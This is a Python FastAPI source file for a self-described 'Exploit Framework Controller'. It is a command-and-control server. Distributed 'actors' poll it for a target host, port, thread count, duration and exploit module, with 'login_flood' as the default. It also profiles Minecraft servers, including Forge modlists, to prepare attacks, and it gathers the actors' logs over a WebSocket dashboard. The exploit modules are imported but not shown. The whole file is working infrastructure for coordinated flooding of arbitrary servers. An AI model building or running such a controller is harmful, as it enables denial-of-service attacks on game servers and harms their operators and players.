from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Depends, HTTPException, status
from fastapi.security import APIKeyHeader
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
from pathlib import Path
from datetime import datetime
import json
import asyncio

from .config import TARGET_HOST, TARGET_PORT, THREADS, DURATION, API_KEY
from . import profiler
from .stress import get_all_exploits, get_exploit_by_id

# --- Pydantic Models ---
class TaskConfig(BaseModel):
    host: str
    port: int
    threads: int
    duration: int
    exploit: str # Changed from 'mode'
    exploit_args: Optional[Dict[str, Any]] = {}

class ProfileRequest(BaseModel):
    host: str
    port: int
    timeout: Optional[int] = 5

# --- In-memory State ---
state: Dict[str, Any] = {
    "running": False,
    "task_config": {
        "host": TARGET_HOST,
        "port": TARGET_PORT,
        "threads": THREADS,
        "duration": DURATION,
        "exploit": "login_flood",
        "exploit_args": {}
    },
    "actors": {},
    "profile_cache": {} # Cache for target profile data
}

# --- Connection Manager for WebSockets ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def broadcast_json(self, data: dict):
        message = json.dumps(data, default=str)
        for connection in self.active_connections:
            await connection.send_text(message)

manager = ConnectionManager()

# --- State Management & Broadcasting ---
async def broadcast_status_update():
    """Broadcasts the current state to all connected WebSocket clients."""
    await manager.broadcast_json({"type": "status_update", "payload": state})

async def broadcast_log(log_data: dict):
    """Broadcasts a single log entry."""
    await manager.broadcast_json({"type": "log", "payload": log_data})

# --- API Key Security ---
api_key_header = APIKeyHeader(name="X-API-Key", auto_error=False)

async def get_api_key(key: str = Depends(api_key_header)):
    if key == API_KEY:
        return key
    else:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or missing API Key",
        )

# --- FastAPI App ---
app = FastAPI(title="Exploit Framework Controller", description="Controller for distributed exploitation tasks.")

static_dir = Path(__file__).parent / "static"
app.mount("/static", StaticFiles(directory=static_dir), name="static")

# --- Actor-facing endpoints ---

@app.get("/task")
async def get_task(actor_id: str = "unknown"):
    now = datetime.utcnow()
    if actor_id not in state["actors"]:
        state["actors"][actor_id] = {"last_seen": now.isoformat()}
        await broadcast_status_update()
    else:
        state["actors"][actor_id]["last_seen"] = now.isoformat()

    if state["running"]:
        return state["task_config"]
    else:
        return {"exploit": "idle"}

@app.post("/log")
async def post_log(data: dict):
    log_line_data = data.copy()
    log_line_data['timestamp'] = datetime.utcnow().isoformat()
    
    actor_id = data.get("actor_id", "unknown")
    log_dir = Path("logs")
    log_dir.mkdir(exist_ok=True)
    log_path = log_dir / f"{actor_id}.log"
    with open(log_path, "a") as f:
        f.write(json.dumps(log_line_data) + "\n")
    
    await broadcast_log(log_line_data)
    return {"status": "ok"}

# --- Admin API endpoints ---

@app.get("/api/exploits", dependencies=[Depends(get_api_key)])
def list_exploits():
    """Lists all available exploit modules."""
    exploits = get_all_exploits()
    return [
        {
            "id": ex.id,
            "name": ex.name,
            "description": ex.description,
            "category": ex.category,
            "disabled": False # Future use
        }
        for ex in exploits
    ]

@app.post("/api/profile", dependencies=[Depends(get_api_key)])
async def profile_server(req: ProfileRequest):
    """Profiles a Minecraft server for detailed information."""
    try:
        await broadcast_log({"level": "SYSTEM", "message": f"Profiling {req.host}:{req.port}..."})
        profile_data = await profiler.profile_server(req.host, req.port, req.timeout)
        state["profile_cache"][f"{req.host}:{req.port}"] = profile_data
        await broadcast_log({"level": "SUCCESS", "message": f"Profiling complete. Server Type: {profile_data['type']}"})
        return profile_data
    except Exception as e:
        await broadcast_log({"level": "ERROR", "message": f"Failed to profile server: {e}"})
        return JSONResponse(
            status_code=status.HTTP_400_BAD_REQUEST,
            content={"error": f"Failed to profile server: {e}"}
        )

@app.post("/api/start", dependencies=[Depends(get_api_key)])
async def start_task(config: TaskConfig):
    if state["running"]:
        raise HTTPException(status_code=400, detail="A task is already running.")

    exploit_module = get_exploit_by_id(config.exploit)
    if not exploit_module:
        raise HTTPException(status_code=404, detail=f"Exploit '{config.exploit}' not found.")

    state["task_config"] = config.dict()
    
    # If exploit requires special data (e.g., modlist), prepare it
    if exploit_module.requires_forge:
        profile_key = f"{config.host}:{config.port}"
        if profile_key not in state["profile_cache"] or state["profile_cache"][profile_key].get("type") != "Forge":
             await broadcast_log({"level": "SYSTEM", "message": f"'{exploit_module.name}' requires Forge. Profiling target..."})
             try:
                profile_data = await profiler.profile_server(config.host, config.port)
                state["profile_cache"][profile_key] = profile_data
                if profile_data.get("type") != "Forge":
                    raise HTTPException(status_code=400, detail=f"Exploit requires Forge, but target is {profile_data.get('type')}.")
             except Exception as e:
                await broadcast_log({"level": "ERROR", "message": f"Failed to auto-profile for Forge modlist: {e}. Aborting."})
                raise HTTPException(status_code=400, detail=f"Failed to auto-profile for Forge modlist: {e}")
        
        # Add modlist to exploit args for the actor
        state["task_config"]["exploit_args"]["mod_data"] = state["profile_cache"][profile_key]


    state["running"] = True
    await broadcast_status_update()
    return {"status": "Task started", "config": state["task_config"]}

@app.post("/api/stop", dependencies=[Depends(get_api_key)])
async def stop_task():
    state["running"] = False
    await broadcast_status_update()
    return {"status": "Task stopped"}

@app.put("/api/config", dependencies=[Depends(get_api_key)])
async def update_config(config: TaskConfig):
    if not get_exploit_by_id(config.exploit):
        raise HTTPException(status_code=404, detail=f"Exploit '{config.exploit}' not found.")
    state["task_config"] = config.dict()
    await broadcast_status_update()
    return {"status": "Configuration updated", "new_config": state["task_config"]}

# --- WebSocket Endpoint ---

@app.websocket("/ws/logs")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    await websocket.send_text(json.dumps({"type": "status_update", "payload": state}, default=str))
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

# --- Periodic Actor Pruning ---
async def prune_inactive_actors():
    while True:
        await asyncio.sleep(30)
        now = datetime.utcnow()
        pruned_actors = {
            id: info for id, info in state["actors"].items()
            if (now - datetime.fromisoformat(info["last_seen"])).total_seconds() < 60
        }
        if len(pruned_actors) != len(state["actors"]):
            state["actors"] = pruned_actors
            await broadcast_status_update()

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(prune_inactive_actors())

# --- Web UI Endpoint ---

@app.get("/", response_class=FileResponse)
async def read_index():
    index_path = Path(__file__).parent / "static" / "index.html"
    return FileResponse(index_path)
